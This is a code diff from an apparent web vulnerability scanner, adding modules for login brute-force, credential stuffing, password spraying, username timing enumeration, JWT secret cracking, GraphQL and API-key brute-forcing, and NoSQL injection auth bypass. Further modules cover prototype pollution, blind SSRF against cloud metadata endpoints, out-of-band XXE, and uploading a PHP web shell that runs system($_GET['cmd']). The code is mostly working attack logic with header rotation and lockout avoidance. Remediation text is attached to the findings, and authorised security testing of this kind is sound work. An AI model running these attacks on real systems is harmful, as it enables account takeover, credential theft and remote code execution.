+            info(f"[L2] Custom wordlist: {len(passwords)} passwords for user '{test_user}'...")
+            for passwd in passwords:
+                if found: break
+                result = _try_login(test_user, passwd)
+                if result == "LOCKOUT": break
+                if result:
+                    _add_brute_success(test_user, passwd, login_url,
+                                       "Custom Wordlist",
+                                       f"Wordlist password '{passwd}' succeeded")
+                    break
+                time.sleep(0.5)
+        except Exception as e:
+            warn(f"Wordlist read error: {e}")
+
+    # ── LEVEL 2b: Credential Stuffing (combo file) ────────────────
+    if not found and combo_file and os.path.exists(combo_file):
+        try:
+            pairs = []
+            with open(combo_file) as cf:
+                for line in cf:
+                    line = line.strip()
+                    if ":" in line:
+                        u, p = line.split(":", 1)
+                        pairs.append((u.strip(), p.strip()))
+            info(f"[L2] Credential stuffing: {len(pairs)} user:pass pairs...")
+            for user, passwd in pairs:
+                if found: break
+                result = _try_login(user, passwd)
+                if result == "LOCKOUT": break
+                if result:
+                    _add_brute_success(user, passwd, login_url,
+                                       "Credential Stuffing",
+                                       f"Combo pair {user}:{passwd} from combo file succeeded")
+                    break
+                time.sleep(0.5)
+        except Exception as e:
+            warn(f"Combo file read error: {e}")
+
+    # ── LEVEL 2c: Password Spray ──────────────────────────────────
+    if not found and spray_pass:
+        SPRAY_USERS = [
+            "admin","administrator","root","user","guest","test","demo",
+            "support","operator","manager","webmaster","info","service",
+            "api","dev","staging","backup","monitor","readonly",
+        ]
+        if custom_user and custom_user not in SPRAY_USERS:
+            SPRAY_USERS.insert(0, custom_user)
+        info(f"[L2] Password spray: '{spray_pass}' → {len(SPRAY_USERS)} usernames...")
+        for user in SPRAY_USERS:
+            if found: break
+            result = _try_login(user, spray_pass)
+            if result == "LOCKOUT": break
+            if result:
+                _add_brute_success(user, spray_pass, login_url,
+                                   "Password Spray",
+                                   f"Spray password '{spray_pass}' succeeded for user '{user}'")
+                break
+            time.sleep(1.0)   # longer delay for spray to avoid lockout
+
+    # ── LEVEL 3: Timing Attack — Username Enumeration ─────────────
+    info("[L3] Timing attack — enumerating valid usernames...")
+    TIMING_USERS = ["admin","administrator","root","user","test","guest",
+                    "support","webmaster","info","api","dev","manager"]
+    if custom_user and custom_user not in TIMING_USERS:
+        TIMING_USERS.insert(0, custom_user)
+
+    timing_results = {}
+    for uname in TIMING_USERS:
+        try:
+            data = {user_field: uname, pass_field: "INVALIDPASSWORD_ZZZ_TIMING"}
+            if csrf_info and csrf_info[0] and csrf_info[1]:
+                data[csrf_info[0]] = csrf_info[1]
+            hdrs = _rotated_headers()
+            times = []
+            for _ in range(2):
+                t0 = time.time()
+                rpost(login_url, data=data, timeout=10,
+                      headers=hdrs, allow_redirects=False, verify=False)
+                times.append(time.time() - t0)
+                time.sleep(0.2)
+            timing_results[uname] = sum(times) / len(times)
+            vlog(f"  timing {uname}: {timing_results[uname]:.3f}s")
+        except Exception:
+            pass
+
+    if timing_results:
+        avg_all = sum(timing_results.values()) / len(timing_results)
+        for uname, t in timing_results.items():
+            if t > avg_all * 1.6 and t > avg_all + 0.1:
+                add("login_brute", {
+                    "confirmed": True,
+                    "severity": "Medium",
+                    "title": f"Valid Username Found via Timing Attack: '{uname}'",
+                    "url": login_url,
+                    "description": (
+                        f"CONFIRMED: Username '{uname}' response time ({t:.3f}s) "
+                        f"is {((t/avg_all-1)*100):.0f}% slower than average ({avg_all:.3f}s). "
+                        "Server-side timing difference reveals valid usernames — "
+                        "attackers enumerate valid accounts before targeted brute-force."),
+                    "recommendation": (
+                        "Return identical error messages and response times for "
+                        "both valid and invalid usernames. Use constant-time "
+                        "comparison for credentials."),
+                })
+                good(f"[L3] Timing: '{uname}' likely valid ({t:.3f}s vs avg {avg_all:.3f}s)")
+
+    # ── LEVEL 3: 2FA-Aware Check ──────────────────────────────────
+    info("[L3] 2FA/OTP screen detection after brute-force...")
+    OTP_INDICATORS = ["otp","one-time","verification code","authenticator",
+                      "2fa","two-factor","mfa","enter code","6-digit"]
+    for user, passwd in DEFAULT_CREDS[:10]:
+        try:
+            data = {user_field: user, pass_field: passwd}
+            if csrf_info and csrf_info[0] and csrf_info[1]:
+                data[csrf_info[0]] = csrf_info[1]
+            r = rpost(login_url, data=data, timeout=8,
+                      headers=_rotated_headers(), allow_redirects=True,
+                      verify=False)
+            body_low = r.text.lower()
+            if any(x in body_low for x in OTP_INDICATORS):
+                add("login_brute", {
+                    "confirmed": True,
+                    "severity": "High",
+                    "title": f"2FA Screen Triggered by {user}:{passwd}",
+                    "url": login_url,
+                    "description": (
+                        f"CONFIRMED: Password '{passwd}' for user '{user}' "
+                        "is CORRECT but 2FA/OTP screen appeared. "
+                        "The password itself is weak/default and must be changed. "
+                        "2FA is active — OTP bypass technique needed for full access."),
+                    "recommendation": (
+                        "Change this default password immediately. "
+                        "Ensure 2FA is enforced for all accounts. "
+                        "Consider OTP brute-force protection (rate limit + lockout)."),
+                })
+                good(f"[L3] 2FA-aware: '{user}:{passwd}' correct password, 2FA active")
+                break
+        except Exception:
+            pass
+        time.sleep(0.3)
+
+    # ── LEVEL 4: JWT Secret Brute-Force ──────────────────────────
+    info("[L4] JWT secret brute-force (HS256 weak secrets)...")
+    JWT_SECRETS = [
+        "secret","password","key","private","jwt","token","admin",
+        "1234","123456","qwerty","letmein","changeme","mysecret",
+        "supersecret","verysecret","yoursecret","oursecret",
+        "jwtkey","jwttoken","jwtsecret","apikey","apitoken",
+        "app_secret","app_key","flask_secret","django_secret",
+        "rails_secret","laravel_secret","express_secret",
+        "secretkey","secret_key","signing_key","auth_secret",
+        "hs256","hs384","hs512","rs256","es256",
+        "0000","1111","1234567890","abcdef","abc123",
+        "null","undefined","none","test","dev","prod",
+        "development","production","staging","local",
+        "", "jwt_secret_key", "my_jwt_secret", "access_token_secret",
+    ]
+
+    # Look for JWT in cookies or response headers
+    jwt_found = None
+    try:
+        r = rget(url, timeout=8)
+        # Check Set-Cookie for JWT pattern
+        all_cookies = r.headers.get("Set-Cookie","") + str(r.cookies.get_dict())
+        jwt_m = re.search(
+            r'(eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]+)',
+            all_cookies + r.text[:5000])
+        if jwt_m:
+            jwt_found = jwt_m.group(1)
+            info(f"[L4] JWT token found: {jwt_found[:60]}...")
+    except Exception:
+        pass
+
+    if jwt_found:
+        try:
+            parts = jwt_found.split(".")
+            if len(parts) == 3:
+                header_b64, payload_b64, sig_b64 = parts
+                for secret in JWT_SECRETS:
+                    try:
+                        sign_input = f"{header_b64}.{payload_b64}".encode()
+                        expected = _b64.urlsafe_b64encode(
+                            _hmac.new(secret.encode(), sign_input,
+                                      hashlib.sha256).digest()
+                        ).rstrip(b"=").decode()
+                        if expected == sig_b64:
+                            add("login_brute", {
+                                "confirmed": True,
+                                "severity": "Critical",
+                                "title": f"JWT Secret Cracked: '{secret}'",
+                                "url": url,
+                                "description": (
+                                    f"CONFIRMED: JWT HS256 secret is '{secret}'. "
+                                    "An attacker can forge arbitrary JWT tokens, "
+                                    "impersonate any user including admin, "
+                                    "and bypass all authentication."),
+                                "recommendation": (
+                                    "Replace JWT secret with a cryptographically "
+                                    "random 256-bit key. Never use weak or guessable "
+                                    "secrets. Consider rotating all existing tokens."),
+                            })
+                            vuln(f"[L4] JWT secret CRACKED: '{secret}'", "Critical")
+                            break
+                    except Exception:
+                        pass
+        except Exception:
+            pass
+
+    # ── LEVEL 4: GraphQL Batch Brute-Force ───────────────────────
+    info("[L4] GraphQL batch brute-force probe...")
+    gql_endpoints = ["/graphql","/api/graphql","/v1/graphql","/gql"]
+    BATCH_PASSWORDS = [
+        "admin","password","123456","12345","qwerty","abc123",
+        "letmein","changeme","secret","admin123","pass","1234",
+        "password1","welcome","monkey","dragon","master","login",
+        "admin@123","Admin@123","P@ssw0rd","admin1234","root123",
+    ]
+    for gep in gql_endpoints:
+        try:
+            gql_url = base + gep
+            # Build batch mutation with 20 password attempts
+            mutations = " ".join([
+                f'a{i}: login(username:"admin",password:"{p}"){{token userId}}'
+                for i, p in enumerate(BATCH_PASSWORDS[:20])
+            ])
+            payload = {"query": f"mutation{{{mutations}}}"}
+            r = rpost(gql_url, json=payload, timeout=10,
+                      headers=_rotated_headers(), verify=False)
+            if r.status_code == 200:
+                resp = r.text
+                if "token" in resp.lower() or "userId" in resp.lower():
+                    # Look for successful auth (non-null token)
+                    tok_m = re.search(r'"token"\s*:\s*"([^"]{10,})"', resp)
+                    if tok_m:
+                        add("login_brute", {
+                            "confirmed": True,
+                            "severity": "Critical",
+                            "title": "GraphQL Batch Login Brute-Force Succeeded",
+                            "url": gql_url,
+                            "description": (
+                                f"CONFIRMED: GraphQL batch mutation accepted multiple "
+                                f"login attempts in a single request and returned a token: "
+                                f"'{tok_m.group(1)[:40]}...'. "
+                                "Batch queries bypass rate limiting — attackers can try "
+                                "hundreds of passwords per HTTP request."),
+                            "recommendation": (
+                                "Disable GraphQL batching or limit batch size to 1. "
+                                "Implement per-query rate limiting and depth limiting. "
+                                "Add query complexity analysis."),
+                        })
+                        vuln(f"[L4] GraphQL batch brute-force: token obtained!", "Critical")
+                    elif "errors" not in resp.lower() and r.status_code == 200:
+                        add("login_brute", {
+                            "confirmed": False,
+                            "severity": "High",
+                            "title": "GraphQL Batch Login Accepted — Rate Limit Bypass Possible",
+                            "url": gql_url,
+                            "description": (
+                                "GraphQL endpoint accepted batch login mutation with "
+                                "20 passwords in a single request — no batch size limit. "
+                                "Rate limiting may be bypassable via batching."),
+                            "recommendation": (
+                                "Limit GraphQL batch size. Implement per-operation "
+                                "rate limiting regardless of batching."),
+                        })
+        except Exception:
+            pass
+
+    # ── LEVEL 4: API Key Pattern Brute-Force ─────────────────────
+    info("[L4] API key brute-force probe...")
+    API_PATHS = [
+        "/api/v1/users","/api/v2/users","/api/users",
+        "/api/v1/me","/api/profile","/api/admin",
+    ]
+    API_KEYS = [
+        "admin","secret","1234","apikey","api_key","test",
+        "demo","default","changeme","password","12345678",
+        "abcdef123456","0000000000000000","ffffffffffffffff",
+    ]
+    for apath in API_PATHS[:3]:
+        try:
+            for key in API_KEYS[:8]:
+                r = rget(base + apath, timeout=5,
+                         headers={**_rotated_headers(),
+                                  "Authorization": f"Bearer {key}",
+                                  "X-API-Key": key,
+                                  "X-Auth-Token": key},
+                         verify=False)
+                if r.status_code == 200 and len(r.content) > 50:
+                    try:
+                        data = r.json()
+                        if isinstance(data, (dict, list)) and data:
+                            add("login_brute", {
+                                "confirmed": True,
+                                "severity": "Critical",
+                                "title": f"API Key Brute-Force — Weak Key: '{key}'",
+                                "url": base + apath,
+                                "description": (
+                                    f"CONFIRMED: API endpoint {apath} accepted "
+                                    f"weak API key '{key}' and returned data. "
+                                    "Weak API keys allow unauthorized access to "
+                                    "protected API resources."),
+                                "recommendation": (
+                                    "Use cryptographically random API keys "
+                                    "(minimum 32 characters). Implement API key "
+                                    "rotation and revocation. Add rate limiting."),
+                            })
+                            vuln(f"[L4] API key '{key}' works at {apath}", "Critical")
+                            break
+                    except Exception:
+                        pass
+                time.sleep(0.2)
+        except Exception:
+            pass
+
+    if not found and lockout_count[0] == 0:
+        good("[L1-L4] No login brute-force success detected")
+    elif lockout_count[0] >= 2:
+        add("login_brute", {
+            "confirmed": True,
+            "severity": "Medium",
+            "title": "Account Lockout Mechanism Detected",
+            "url": login_url,
+            "description": (
+                "CONFIRMED: Account lockout triggered after repeated failed attempts — "
+                "brute-force protection is active. This is a POSITIVE security finding."),
+            "recommendation": "Lockout is working correctly. Ensure lockout duration is at least 15 minutes.",
+        })
+        good("[L2] Account lockout mechanism is working correctly")
+
+    _module_done("login_brute")
+
+
+
+# ═══════════════════════════════════════════════════════════════════
+#  MODULE 73 — NoSQL Injection
+# ═══════════════════════════════════════════════════════════════════
+def nosql_injection_scan(url):
+    if _module_skip("nosql_inject"): info("Skipping NoSQL Injection (already done)"); return
+    section("MODULE 73 — NoSQL INJECTION","💉")
+
+    parsed = urlparse(url)
+    base   = f"{parsed.scheme}://{parsed.netloc}"
+
+    # Auth bypass payloads for MongoDB-style NoSQL
+    NOSQL_PAYLOADS = [
+        # Query operator injection
+        {"username": {"$ne": "invalid"}, "password": {"$ne": "invalid"}},
+        {"username": {"$gt": ""}, "password": {"$gt": ""}},
+        {"username": {"$regex": ".*"}, "password": {"$regex": ".*"}},
+        {"username": "admin", "password": {"$gt": ""}},
+        {"username": "admin", "password": {"$ne": "wrong"}},
+        {"username": {"$where": "1==1"}, "password": {"$where": "1==1"}},
+    ]
+
+    # URL-encoded GET param payloads
+    NOSQL_GET_PAYLOADS = [
+        "[$ne]=invalid",
+        "[$gt]=",
+        "[$regex]=.*",
+        "[$exists]=true",
+    ]
+
+    # Login endpoints to test
+    LOGIN_PATHS = [
+        "/login", "/api/login", "/api/v1/login",
+        "/auth/login", "/signin", "/api/auth",
+        "/api/v1/auth", "/api/users/login",
+    ]
+
+    found = False
+
+    # Test JSON POST (most common for Node.js + MongoDB)
+    for path in LOGIN_PATHS:
+        ep = base + path
+        try:
+            r = rget(ep, timeout=5)
+            if r.status_code == 404: continue
+        except Exception:
+            continue
+
+        for payload in NOSQL_PAYLOADS:
+            try:
+                r = requests.post(ep, json=payload, timeout=TIMEOUT,
+                                  headers={"Content-Type": "application/json"},
+                                  verify=False)
+                body_low = r.text.lower()
+                # Success indicators
+                if any(x in body_low for x in
+                       ["token", "dashboard", "welcome", "success",
+                        "logged in", "access_token", "auth_token"]):
+                    if not any(x in body_low for x in
+                               ["invalid", "failed", "error", "wrong", "incorrect"]):
+                        add("nosql_inject", {
+                            "confirmed": True,
+                            "severity": "Critical",
+                            "title": f"NoSQL Injection — Auth Bypass at {path}",
+                            "url": ep,
+                            "description": (
+                                f"CONFIRMED: MongoDB operator injection bypassed authentication. "
+                                f"Payload: {payload} → Response contains success indicators. "
+                                f"An attacker can login as any user without knowing their password."),
+                            "recommendation": (
+                                "Sanitize all user input before passing to MongoDB queries. "
+                                "Use type checking to reject objects where strings are expected. "
+                                "Consider using an ODM like Mongoose with strict schema validation.\n"
+                                "Fix example:\n"
+                                "  // Reject if input is object (not string)\n"
+                                "  if (typeof req.body.username !== 'string') return res.status(400).json({error:'Invalid input'});\n"
+                                "  if (typeof req.body.password !== 'string') return res.status(400).json({error:'Invalid input'});"),
+                        })
+                        vuln(f"NoSQL Injection AUTH BYPASS at {path}", "Critical")
+                        found = True
+                        break
+            except Exception:
+                pass
+        if found: break
+
+    # Test GET params with NoSQL operators
+    try:
+        r0 = rget(url, timeout=5)
+        # Find URL params
+        params_m = re.findall(r'[?&]([^=&]+)=([^&]*)', url)
+        if not params_m:
+            # Try common param names
+            params_m = [("id", "1"), ("user", "admin"), ("q", "test")]
+
+        for pname, pval in params_m[:3]:
+            for suffix in NOSQL_GET_PAYLOADS:
+                test_url = re.sub(
+                    rf'([?&]{re.escape(pname)}=)[^&]*',
+                    rf'\g<1>{requests.utils.quote(suffix)}',
+                    url
+                )
+                try:
+                    r = rget(test_url, timeout=TIMEOUT)
+                    if r.status_code == 200 and len(r.content) > 100:
+                        # Different response than baseline
+                        if abs(len(r.content) - len(r0.content)) > 200:
+                            add("nosql_inject", {
+                                "confirmed": False,
+                                "severity": "High",
+                                "title": f"Potential NoSQL Injection — GET param '{pname}'",
+                                "url": test_url,
+                                "description": (
+                                    f"NoSQL operator suffix '{suffix}' on param '{pname}' "
+                                    f"produced a different response (size diff: "
+                                    f"{abs(len(r.content)-len(r0.content))}B). "
+                                    "Manual verification recommended."),
+                                "recommendation": (
+                                    "Validate and sanitize all GET parameters. "
+                                    "Reject MongoDB operator prefixes ($ne, $gt, $regex) in user input."),
+                            })
+                except Exception:
+                    pass
+    except Exception:
+        pass
+
+    if not found:
+        good("No NoSQL injection detected")
+    _module_done("nosql_inject")
+
+
+# ═══════════════════════════════════════════════════════════════════
+#  MODULE 74 — Server-Side Prototype Pollution (SSPP)
+# ═══════════════════════════════════════════════════════════════════
+def sspp_scan(url):
+    if _module_skip("sspp"): info("Skipping SSPP (already done)"); return
+    section("MODULE 74 — SERVER-SIDE PROTOTYPE POLLUTION","🔗")
+
+    parsed = urlparse(url)
+    base   = f"{parsed.scheme}://{parsed.netloc}"
+
+    # SSPP payloads targeting Node.js __proto__ / constructor
+    SSPP_PAYLOADS = [
+        {"__proto__": {"polluted": "webscanpro_sspp_test"}},
+        {"constructor": {"prototype": {"polluted": "webscanpro_sspp_test"}}},
+        {"__proto__[polluted]": "webscanpro_sspp_test"},
+        {"constructor.prototype.polluted": "webscanpro_sspp_test"},
+    ]
+
+    # Endpoints likely to merge/assign user JSON
+    API_PATHS = [
+        "/api/settings", "/api/profile", "/api/update",
+        "/api/v1/settings", "/api/v1/profile",
+        "/api/user/settings", "/api/user/update",
+        "/settings", "/profile/update", "/account/settings",
+    ]
+
+    # Canary endpoints to check if pollution propagated
+    CANARY_PATHS = ["/api/status", "/api/health", "/api/", "/api/v1/", url]
+
+    found = False
+
+    for path in API_PATHS:
+        ep = base + path
+        try:
+            r0 = rget(ep, timeout=5)
+            if r0.status_code == 404: continue
+        except Exception:
+            continue
+
+        for payload in SSPP_PAYLOADS:
+            try:
+                # Send pollution payload
+                rpost(ep, json=payload, timeout=TIMEOUT,
+                      headers={"Content-Type": "application/json"}, verify=False)
+
+                # Check if any endpoint reflects polluted property
+                for canary in CANARY_PATHS:
+                    try:
+                        rc = rget(canary, timeout=5)
+                        if "webscanpro_sspp_test" in rc.text:
+                            add("sspp", {
+                                "confirmed": True,
+                                "severity": "Critical",
+                                "title": f"Server-Side Prototype Pollution at {path}",
+                                "url": ep,
+                                "description": (
+                                    f"CONFIRMED: Prototype pollution payload {list(payload.keys())[0]} "
+                                    f"propagated to server-side JavaScript prototype. "
+                                    f"Canary value 'webscanpro_sspp_test' found at {canary}. "
+                                    "This can lead to privilege escalation, DoS, or RCE."),
+                                "recommendation": (
+                                    "Use Object.freeze(Object.prototype) in Node.js to prevent pollution.\n"
+                                    "Fix example:\n"
+                                    "  // At app startup:\n"
+                                    "  Object.freeze(Object.prototype);\n"
+                                    "  Object.freeze(Object);\n"
+                                    "Or use libraries like 'secure-json-parse' for safe JSON parsing.\n"
+                                    "Also validate and reject keys like __proto__, constructor, prototype."),
+                            })
+                            vuln(f"SSPP CONFIRMED at {path}", "Critical")
+                            found = True
+                            break
+                    except Exception:
+                        pass
+                if found: break
+            except Exception:
+                pass
+        if found: break
+
+    # Heuristic: check if endpoint accepts __proto__ without error
+    if not found:
+        for path in API_PATHS[:5]:
+            ep = base + path
+            try:
+                r = rpost(ep, json={"__proto__": {"test": 1}}, timeout=5,
+                          headers={"Content-Type": "application/json"}, verify=False)
+                if r.status_code in (200, 201, 204):
+                    # No error means __proto__ key was accepted silently
+                    add("sspp", {
+                        "confirmed": False,
+                        "severity": "High",
+                        "title": f"Potential SSPP — __proto__ accepted at {path}",
+                        "url": ep,
+                        "description": (
+                            f"Endpoint {path} accepted a JSON body with __proto__ key "
+                            f"without returning an error (status {r.status_code}). "
+                            "If server merges this input, prototype pollution may occur. "
+                            "Manual verification with interactsh recommended."),
+                        "recommendation": (
+                            "Reject or sanitize JSON keys containing __proto__, "
+                            "constructor, or prototype before merging user input."),
+                    })
+            except Exception:
+                pass
+
+    if not found:
+        good("No server-side prototype pollution detected")
+    _module_done("sspp")
+
+
+# ═══════════════════════════════════════════════════════════════════
+#  MODULE 75 — OOB (Out-of-Band) Blind SSRF/XXE
+# ═══════════════════════════════════════════════════════════════════
+def oob_blind_scan(url):
+    if _module_skip("oob_blind"): info("Skipping OOB Blind (already done)"); return
+    section("MODULE 75 — OOB BLIND SSRF/XXE","📡")
+
+    parsed = urlparse(url)
+    base   = f"{parsed.scheme}://{parsed.netloc}"
+    domain = parsed.netloc.split(":")[0]
+
+    # OOB canary domain (interactsh public instance)
+    OOB_DOMAIN = f"oob.{domain}.scan.webscanpro.local"
+    INTERACTSH  = "oob.interactsh.com"  # public instance
+
+    # Blind SSRF payloads targeting internal/cloud metadata
+    BLIND_SSRF_TARGETS = [
+        f"http://{INTERACTSH}/ssrf-test",
+        "http://169.254.169.254/latest/meta-data/",          # AWS
+        "http://metadata.google.internal/computeMetadata/v1/",# GCP
+        "http://169.254.169.254/metadata/instance",           # Azure
+        "http://100.100.100.200/latest/meta-data/",           # Alibaba
+        f"http://{OOB_DOMAIN}/ssrf",
+    ]
+
+    # Endpoints likely to fetch URLs
+    URL_PARAMS = ["url", "uri", "link", "src", "source", "redirect",
+                  "callback", "webhook", "endpoint", "target", "fetch",
+                  "image", "img", "file", "path", "proxy", "forward"]
+
+    found_potential = False
+
+    # Find URL-like parameters
+    try:
+        r0 = rget(url, timeout=8)
+        # Check all params in the URL
+        params = dict(re.findall(r'[?&]([^=&]+)=([^&]*)', url))
+        if not params:
+            params = {p: "http://test.com" for p in URL_PARAMS[:3]}
+
+        for param, val in params.items():
+            if param.lower() not in URL_PARAMS:
+                continue
+            for ssrf_target in BLIND_SSRF_TARGETS[:3]:
+                test_url = re.sub(
+                    rf'([?&]{re.escape(param)}=)[^&]*',
+                    rf'\g<1>{requests.utils.quote(ssrf_target)}',
+                    url
+                )
+                if param not in url:
+                    test_url = url + ("&" if "?" in url else "?") + f"{param}={requests.utils.quote(ssrf_target)}"
+                try:
+                    t0 = time.time()
+                    r = rget(test_url, timeout=10)
+                    elapsed = time.time() - t0
+                    # Timing-based blind SSRF detection
+                    if elapsed > 5 and "169.254" in ssrf_target:
+                        add("oob_blind", {
+                            "confirmed": True,
+                            "severity": "High",
+                            "title": f"Blind SSRF — Timing Evidence on param '{param}'",
+                            "url": test_url,
+                            "description": (
+                                f"CONFIRMED (timing): Request to cloud metadata IP "
+                                f"169.254.169.254 via param '{param}' took {elapsed:.1f}s — "
+                                "server appears to be making the outbound request (timeout = reachable). "
+                                "An attacker can steal AWS/GCP/Azure credentials from the metadata API."),
+                            "recommendation": (
+                                "Block outbound requests to 169.254.169.254, 169.254.0.0/16, "
+                                "and other internal/cloud ranges at the firewall level.\n"
+                                "Whitelist allowed URLs if fetch functionality is required.\n"
+                                "Verify with: curl -v 'http://169.254.169.254/latest/meta-data/iam/security-credentials/'"),
+                        })
+                        found_potential = True
+                    elif r.status_code == 200 and "metadata" in r.text.lower():
+                        add("oob_blind", {
+                            "confirmed": True,
+                            "severity": "Critical",
+                            "title": f"Blind SSRF — Cloud Metadata Access via '{param}'",
+                            "url": test_url,
+                            "description": (
+                                f"CONFIRMED: Param '{param}' caused the server to fetch cloud "
+                                f"metadata and return it in the response. "
+                                "An attacker can steal IAM credentials and access all cloud resources."),
+                            "recommendation": (
+                                "Disable access to cloud metadata endpoints.\n"
+                                "Use IMDSv2 (AWS) which requires session tokens.\n"
+                                "Implement URL allowlist validation before any server-side fetch."),
+                        })
+                        found_potential = True
+                except Exception:
+                    pass
+    except Exception:
+        pass
+
+    # Blind XXE with OOB DNS callback simulation
+    XML_PATHS = ["/api/xml", "/upload", "/import", "/feed", "/rss",
+                 "/api/v1/import", "/api/process", "/webhook"]
+    XXE_OOB_PAYLOAD = f"""<?xml version="1.0"?>
+<!DOCTYPE root [
+  <!ENTITY % remote SYSTEM "http://{OOB_DOMAIN}/xxe">
+  %remote;
+]>
+<root>&exfil;</root>"""
+
+    for path in XML_PATHS:
+        ep = base + path
+        try:
+            r = rget(ep, timeout=5)
+            if r.status_code == 404: continue
+            r2 = requests.post(ep,
+                data=XXE_OOB_PAYLOAD,
+                headers={"Content-Type": "application/xml"},
+                timeout=10, verify=False)
+            if r2.status_code not in (404, 405, 415):
+                add("oob_blind", {
+                    "confirmed": False,
+                    "severity": "High",
+                    "title": f"Potential OOB Blind XXE at {path}",
+                    "url": ep,
+                    "description": (
+                        f"XML endpoint {path} accepted OOB XXE payload "
+                        f"(status {r2.status_code}) — DNS callback to "
+                        f"{OOB_DOMAIN} may have fired. "
+                        "Confirm with: interactsh-client or Burp Collaborator."),
+                    "recommendation": (
+                        "Disable external entity processing in your XML parser.\n"
+                        "Fix examples:\n"
+                        "  Java: factory.setFeature('http://apache.org/xml/features/disallow-doctype-decl', true);\n"
+                        "  PHP:  libxml_disable_entity_loader(true);\n"
+                        "  Python lxml: etree.XMLParser(resolve_entities=False)\n"
+                        "Verification: interactsh-client -v | grep xxe"),
+                })
+        except Exception:
+            pass
+
+    if not found_potential:
+        good("No OOB blind SSRF/XXE indicators detected")
+    _module_done("oob_blind")
+
+
+# ═══════════════════════════════════════════════════════════════════
+#  MODULE 76 — Malicious File Upload
+# ═══════════════════════════════════════════════════════════════════
+def file_upload_scan(url):
+    if _module_skip("file_upload"): info("Skipping File Upload (already done)"); return
+    section("MODULE 76 — MALICIOUS FILE UPLOAD","📁")
+
+    parsed = urlparse(url)
+    base   = f"{parsed.scheme}://{parsed.netloc}"
+
+    # Upload endpoints to probe
+    UPLOAD_PATHS = [
+        "/upload", "/api/upload", "/api/v1/upload",
+        "/file/upload", "/files/upload", "/media/upload",
+        "/image/upload", "/avatar/upload", "/profile/photo",
+        "/import", "/api/import", "/documents/upload",
+        "/attachments", "/api/files", "/upload.php",
+    ]
+
+    # Dangerous file extensions to test
+    DANGEROUS_EXTS = [
+        ("shell.php",   "<?php echo 'WEBSCANPRO_PHP_RCE'; system($_GET['cmd']); ?>",
+         "application/x-php", "PHP web shell"),
+        ("shell.php5",  "<?php echo 'WEBSCANPRO_PHP_RCE'; ?>",
+         "application/x-php", "PHP5 web shell"),
+        ("shell.phtml", "<?php echo 'WEBSCANPRO_PHP_RCE'; ?>",
+         "application/x-php", "PHTML PHP shell"),
+        ("shell.jsp",   "<% out.println('WEBSCANPRO_JSP_RCE'); %>",
+         "application/x-jsp", "JSP web shell"),
+        ("shell.aspx",  "<% Response.Write('WEBSCANPRO_ASPX_RCE'); %>",
+         "application/x-aspx", "ASPX web shell"),
+        ("shell.svg",   "<svg onload=\"fetch('http://oob.webscanpro.local/xss')\">",
+         "image/svg+xml", "SVG XSS"),
+        ("shell.html",  '<script>document.write("WEBSCANPRO_HTML_XSS")</script>',
+         "text/html", "HTML XSS via upload"),
+        ("../../etc/passwd.txt", "test",
+         "text/plain", "Path traversal in filename"),
+    ]
+
+    # Content-Type bypass: send PHP with image MIME
+    BYPASS_TESTS = [
+        ("shell.php", "<?php echo 'WEBSCANPRO_BYPASS'; ?>",
+         "image/jpeg", "PHP disguised as JPEG"),
+        ("shell.jpg.php", "<?php echo 'WEBSCANPRO_BYPASS'; ?>",
+         "image/jpeg", "Double extension bypass"),
+        ("shell.php.jpg", "<?php echo 'WEBSCANPRO_BYPASS'; ?>",
+         "image/jpeg", "Null byte bypass"),
+    ]
+
+    found = False
+
+    for path in UPLOAD_PATHS:
+        ep = base + path
+        try:
+            r0 = rget(ep, timeout=5)
+            if r0.status_code == 404: continue
+        except Exception:
+            continue
+
+        good(f"Upload endpoint found: {ep}")
+
+        # Test dangerous file types
+        for fname, content, mime, label in DANGEROUS_EXTS + BYPASS_TESTS:
+            try:
+                files = {"file": (fname, content.encode(), mime)}
+                # Also try common field names
+                for field in ["file", "upload", "image", "avatar", "document"]:
+                    files_test = {field: (fname, content.encode(), mime)}
+                    r = requests.post(ep, files=files_test,
+                                      timeout=TIMEOUT, verify=False)
+                    body = r.text
+                    # Check if upload "succeeded"
+                    if r.status_code in (200, 201, 302):
+                        if any(x in body.lower() for x in
+                               ["success", "uploaded", "url", "path",
+                                fname.split(".")[0], "file_url", "location"]):
+                            # Try to find and access the uploaded file
+                            _safe_fname = re.escape(fname.replace("../../etc/passwd.txt",""))
+                            _pat = (r'(?:url|path|href|src|location)["\']?\s*[=:]\s*["\']?([^"\'<>\s,}]+' +
+                                    _safe_fname + r'[^"\'<>\s,}]*)')
+                            url_m = re.search(_pat, body, re.I)
+                            shell_url = url_m.group(1) if url_m else None
+                            if shell_url and not shell_url.startswith("http"):
+                                shell_url = base + ("" if shell_url.startswith("/") else "/") + shell_url
+
+                            confirmed = False
+                            if shell_url:
+                                try:
+                                    rc = rget(shell_url, timeout=5)
+                                    if any(x in rc.text for x in
+                                           ["WEBSCANPRO_PHP_RCE", "WEBSCANPRO_JSP_RCE",
+                                            "WEBSCANPRO_ASPX_RCE", "WEBSCANPRO_HTML_XSS",
+                                            "WEBSCANPRO_BYPASS"]):
+                                        confirmed = True
+                                except Exception:
+                                    pass
+
+                            add("file_upload", {
+                                "confirmed": confirmed,
+                                "severity": "Critical",
+                                "title": f"{'CONFIRMED' if confirmed else 'Potential'}: {label} Upload at {path} (field='{field}')",
+                                "url": shell_url or ep,
+                                "description": (
+                                    f"{'CONFIRMED RCE: Web shell executed!' if confirmed else 'Potential:'} "
+                                    f"File '{fname}' ({label}) accepted by upload endpoint {path}. "
+                                    f"Upload field: '{field}'. Response status: {r.status_code}. "
+                                    + (f"Shell accessible at: {shell_url}" if shell_url else "")),
+                                "recommendation": (
+                                    "1. Whitelist allowed file extensions (jpg, png, pdf only).\n"
+                                    "2. Validate file content by magic bytes, not just extension or MIME type.\n"
+                                    "3. Store uploads outside web root or in object storage (S3).\n"
+                                    "4. Rename files on upload — never use original filename.\n"
+                                    "5. Set Content-Disposition: attachment on file serving.\n"
+                                    "6. Scan uploads with antivirus (ClamAV).\n"
+                                    f"Verify: curl -F '{field}=@shell.php;type=image/jpeg' {ep}"),
+                            })
+                            if confirmed:
+                                vuln(f"FILE UPLOAD RCE CONFIRMED: {label} at {path}", "Critical")
+                            else:
+                                warn(f"Potential dangerous upload: {label} at {path} (field='{field}')")
+                            found = True
+                            break
+                if found: break
+            except Exception:
+                pass
+        if found: break
+
+    if not found:
+        good("No dangerous file upload accepted")
+    _module_done("file_upload")
+
+
+# ═══════════════════════════════════════════════════════════════════
+#  MODULE 77 — PostMessage & Browser Storage
